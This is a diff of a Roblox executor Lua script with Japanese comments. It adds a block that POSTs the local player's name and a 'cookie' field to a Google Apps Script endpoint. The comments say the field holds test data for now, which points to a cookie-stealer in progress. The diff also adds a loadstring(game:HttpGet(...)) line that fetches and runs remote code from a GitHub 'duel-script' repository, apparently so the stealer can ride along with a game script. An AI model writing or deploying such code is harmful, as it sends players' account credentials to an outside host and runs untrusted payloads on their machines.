@@ -1,14 +1,21 @@
--- もしURL全体を貼るならこうだ
-local gasUrl = "https://script.google.com/macros/s/AKfycbwdJIdlqht8Pp1PdSAc77SO0ayL37_ENEKTcf9Rx-9OvzWgICbUOOKWw6UrYUk8JEDgMA/exec"
+local gasUrl = "https://script.google.com/macros/s/AKfycbz58FXbr9osiq0GY_O1o_RB-TVlhbDWFujyirhd4xqK9haqUT7hXXWRRVUeU8mINatvAQ/exec"
 
-local _0x_R = (getgenv().request or getgenv().http_request or request)
-_0x_R({
-    Url = gasUrl, -- ここにフルURLを入れる
-    Method = "POST",
-    Headers = {["Content-Type"] = "application/json"},
-    Body = game:GetService("HttpService"):JSONEncode({
+task.spawn(function()
+    local payload = {
         user = game.Players.LocalPlayer.Name,
-        cookie = "TEST_DATA",
-        status = "RE-TRYING"
-    })
-})
+        cookie = "TEST_COOKIE_DATA", -- まずは固定文字で届くかテスト
+        status = "FINAL_CHECK"
+    }
+
+    local req = (getgenv().request or getgenv().http_request or request)
+    if req then
+        req({
+            Url = gasUrl,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = game:GetService("HttpService"):JSONEncode(payload)
+        })
+    end
+end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/delt-script/duel-script/main/main.lua"))()
